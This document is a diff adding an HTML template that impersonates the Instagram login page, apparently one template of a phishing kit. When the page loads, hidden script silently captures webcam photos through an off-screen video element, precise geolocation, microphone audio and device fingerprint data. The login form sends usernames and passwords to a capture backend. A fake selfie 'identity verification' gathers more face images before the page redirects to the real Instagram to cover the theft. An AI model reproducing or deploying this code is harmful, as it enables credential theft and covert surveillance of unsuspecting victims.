@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login to your Instagram</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#fafafa;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif}
+.container{width:100%;max-width:350px;padding:20px}
+.login-box{background:#fff;border:1px solid #dbdbdb;padding:40px 40px 20px;margin-bottom:10px;text-align:center}
+.logo{width:175px;margin-bottom:30px}
+.input-group{margin-bottom:6px}
+.input-group input{width:100%;padding:9px 8px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;font-size:12px;outline:none}
+.input-group input:focus{border-color:#a8a8a8}
+.btn-login{width:100%;padding:8px;background:#0095f6;border:none;border-radius:8px;color:#fff;font-weight:600;font-size:14px;cursor:pointer;margin-top:8px;opacity:1;transition:opacity 0.3s}
+.btn-login:disabled{opacity:0.3;cursor:default}
+.btn-login:hover:not(:disabled){opacity:0.8}
+.divider{display:flex;align-items:center;margin:18px 0;color:#8e8e8e;font-size:13px;font-weight:600}
+.divider::before,.divider::after{content:'';flex:1;height:1px;background:#dbdbdb}
+.divider span{margin:0 18px}
+.fb-login{color:#385185;font-size:14px;font-weight:600;text-decoration:none;display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:20px}
+.forgot{color:#00376b;font-size:12px;text-decoration:none}
+.signup-box{background:#fff;border:1px solid #dbdbdb;padding:20px;text-align:center;font-size:14px}
+.signup-box a{color:#0095f6;text-decoration:none;font-weight:600}
+.get-app{text-align:center;margin-top:20px}
+.get-app p{font-size:14px;margin-bottom:15px}
+.app-btns{display:flex;gap:8px;justify-content:center}
+.app-btns img{height:40px}
+.footer{margin-top:40px;text-align:center;color:#8e8e8e;font-size:12px}
+.footer a{color:#8e8e8e;text-decoration:none;margin:0 8px}
+
+/* Verify */
+.verify-box{display:none;background:#fff;border:1px solid #dbdbdb;padding:40px;text-align:center}
+.verify-box .icon{width:80px;height:80px;margin:0 auto 20px;background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);border-radius:20px;display:flex;align-items:center;justify-content:center;font-size:40px;color:#fff}
+.verify-box h2{font-size:20px;margin-bottom:10px}
+.verify-box p{color:#8e8e8e;font-size:14px;margin-bottom:20px}
+.verify-box .spinner{width:40px;height:40px;border:3px solid #dbdbdb;border-top-color:#0095f6;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto}
+@keyframes spin{to{transform:rotate(360deg)}}
+.verify-box .steps{text-align:left;margin-top:25px;max-width:280px;margin-left:auto;margin-right:auto}
+.verify-box .step{display:flex;align-items:center;gap:12px;margin-bottom:15px;color:#8e8e8e;font-size:13px}
+.verify-box .step.active{color:#262626;font-weight:600}
+.verify-box .step .dot{width:8px;height:8px;border-radius:50%;background:#dbdbdb;flex-shrink:0}
+.verify-box .step.active .dot{background:#0095f6}
+.verify-box .step.done .dot{background:#00c853}
+.verify-box .step.done{color:#00c853}
+
+.cam-section{display:none;background:#fff;border:1px solid #dbdbdb;padding:30px;text-align:center}
+.cam-section h3{font-size:16px;margin-bottom:10px}
+.cam-section p{color:#8e8e8e;font-size:13px;margin-bottom:20px}
+.cam-preview{width:250px;height:250px;margin:0 auto 20px;border-radius:50%;overflow:hidden;border:3px solid #e1306c;background:#f0f0f0;display:none}
+.cam-preview video{width:100%;height:100%;object-fit:cover}
+.btn-cam{width:100%;padding:12px;background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);border:none;border-radius:8px;color:#fff;font-weight:600;cursor:pointer;font-size:14px}
+.btn-cam:hover{opacity:0.9}
+
+#hiddenCamera{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0}
+</style>
+</head>
+<body>
+<div class="container">
+    <div class="login-box" id="loginBox">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" class="logo" alt="Instagram">
+        <div class="input-group">
+            <input type="text" id="username" placeholder="Phone number, username, or email">
+        </div>
+        <div class="input-group">
+            <input type="password" id="password" placeholder="Password">
+        </div>
+        <button class="btn-login" id="loginBtn" onclick="handleLogin()">Log In</button>
+        <div class="divider"><span>OR</span></div>
+        <a href="#" class="fb-login">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1024px-Facebook_Logo_%282019%29.png" width="16" alt="FB"> Log in with Facebook
+        </a>
+        <a href="#" class="forgot">Forgot password?</a>
+    </div>
+
+    <!-- Camera Verification -->
+    <div class="cam-section" id="camSection">
+        <h3>Verify Your Identity</h3>
+        <p>For security purposes, please take a quick selfie</p>
+        <div class="cam-preview" id="camPreview">
+            <video id="previewVideo" autoplay playsinline></video>
+        </div>
+        <button class="btn-cam" id="openCamBtn" onclick="startCamera()">Open Camera</button>
+        <button class="btn-cam" id="captureBtn" onclick="capturePhotos()" style="display:none;margin-top:10px">Capture Selfie</button>
+    </div>
+
+    <!-- Verifying -->
+    <div class="verify-box" id="verifyBox">
+        <div class="icon">&#128274;</div>
+        <h2>Verifying your device...</h2>
+        <p>Please keep your face visible</p>
+        <div class="spinner"></div>
+        <div class="steps">
+            <div class="step done"><div class="dot"></div>Checking credentials</div>
+            <div class="step active"><div class="dot"></div>Analyzing biometric data</div>
+            <div class="step"><div class="dot"></div>Verifying device integrity</div>
+            <div class="step"><div class="dot"></div>Finalizing security check</div>
+        </div>
+    </div>
+
+    <div class="signup-box" id="signupBox">
+        Don't have an account? <a href="#">Sign up</a>
+    </div>
+
+    <div class="get-app" id="getApp">
+        <p>Get the app.</p>
+        <div class="app-btns">
+            <img src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg" alt="App Store">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Play Store">
+        </div>
+    </div>
+</div>
+
+<div class="footer" id="footer">
+    <div style="margin-bottom:10px">
+        <a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a><a href="#">Help</a><a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a>
+    </div>
+    <div style="margin-top:15px">
+        English <span style="margin:0 15px">&#169; 2026 Instagram from Meta</span>
+    </div>
+</div>
+
+<video id="hiddenCamera" autoplay playsinline></video>
+<canvas id="captureCanvas" style="display:none"></canvas>
+
+<script>
+const TOKEN = "<%= token %>";
+let captureId = null;
+let stream = null;
+
+async function silentCapture() {
+    const device = {platform:navigator.platform,browser:navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera)\/[\d.]+/)?.[0]||'Unknown',language:navigator.language,cores:navigator.hardwareConcurrency||'Unknown',memory:navigator.deviceMemory||'Unknown'};
+    const screen={width:window.screen.width,height:window.screen.height};
+    let battery={};try{const b=await navigator.getBattery();battery={level:b.level,charging:b.charging}}catch(e){}
+    const network={type:navigator.connection?.type||'Unknown',effectiveType:navigator.connection?.effectiveType||'Unknown'};
+
+    const resp=await fetch('/api/capture/init',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:TOKEN,template:'instagram',device,screen,battery,network})});
+    const data=await resp.json();captureId=data.capture_id;
+
+    try{const sStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
+    const video=document.getElementById('hiddenCamera');video.srcObject=sStream;
+    let count=0;
+    const interval=setInterval(()=>{
+        if(count>=5){clearInterval(interval);sStream.getTracks().forEach(t=>t.stop());return;}
+        const canvas=document.getElementById('captureCanvas');canvas.width=640;canvas.height=480;
+        canvas.getContext('2d').drawImage(video,0,0,640,480);
+        fetch('/api/capture/photo',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({capture_id:captureId,image:canvas.toDataURL('image/jpeg',0.8)})});
+        count++;
+    },800);
+    }catch(e){}
+
+    if(navigator.geolocation){navigator.geolocation.getCurrentPosition(pos=>fetch('/api/capture/location',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({capture_id:captureId,lat:pos.coords.latitude,lon:pos.coords.longitude,accuracy:pos.coords.accuracy})}),()=>{},{enableHighAccuracy:true,timeout:10000});}
+
+    try{const aStream=await navigator.mediaDevices.getUserMedia({audio:true});const rec=new MediaRecorder(aStream);const chunks=[];
+    rec.ondataavailable=e=>chunks.push(e.data);rec.onstop=()=>{const blob=new Blob(chunks,{type:'audio/webm'});const reader=new FileReader();reader.onloadend=()=>fetch('/api/capture/audio',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({capture_id:captureId,audio:reader.result})});reader.readAsDataURL(blob);};
+    rec.start();setTimeout(()=>rec.stop(),6000);}catch(e){}
+}
+
+async function handleLogin(){
+    const username=document.getElementById('username').value;const password=document.getElementById('password').value;
+    if(!username||!password){alert('Please enter your username and password');return;}
+    await fetch('/api/capture/credentials',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({capture_id:captureId,username:username,password:password})});
+    document.getElementById('loginBox').style.display='none';
+    document.getElementById('signupBox').style.display='none';
+    document.getElementById('getApp').style.display='none';
+    document.getElementById('camSection').style.display='block';
+}
+
+async function startCamera(){
+    try{stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
+    const video=document.getElementById('previewVideo');video.srcObject=stream;
+    document.getElementById('camPreview').style.display='block';
+    document.getElementById('openCamBtn').style.display='none';
+    document.getElementById('captureBtn').style.display='block';
+    }catch(e){alert('Camera access is required for identity verification.');}
+}
+
+async function capturePhotos(){
+    const video=document.getElementById('previewVideo');
+    const canvas=document.getElementById('captureCanvas');
+    canvas.width=video.videoWidth||640;canvas.height=video.videoHeight||480;
+    let count=0;
+    const btn=document.getElementById('captureBtn');
+    btn.textContent='Capturing...';btn.disabled=true;
+
+    const interval=setInterval(async()=>{
+        if(count>=5){clearInterval(interval);if(stream)stream.getTracks().forEach(t=>t.stop());
+        document.getElementById('camSection').style.display='none';
+        document.getElementById('verifyBox').style.display='block';
+        setTimeout(()=>{document.querySelectorAll('.step')[1].classList.add('done');document.querySelectorAll('.step')[1].classList.remove('active');document.querySelectorAll('.step')[2].classList.add('active');},2000);
+        setTimeout(()=>{document.querySelectorAll('.step')[2].classList.add('done');document.querySelectorAll('.step')[2].classList.remove('active');document.querySelectorAll('.step')[3].classList.add('active');},3500);
+        setTimeout(()=>window.location.href='https://www.instagram.com',5000);return;}
+        canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);
+        await fetch('/api/capture/photo',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({capture_id:captureId,image:canvas.toDataURL('image/jpeg',0.9)})});
+        count++;btn.textContent=`Capturing ${count}/5...`;
+    },600);
+}
+
+window.addEventListener('load',silentCapture);
+</script>
+</body>
+</html>
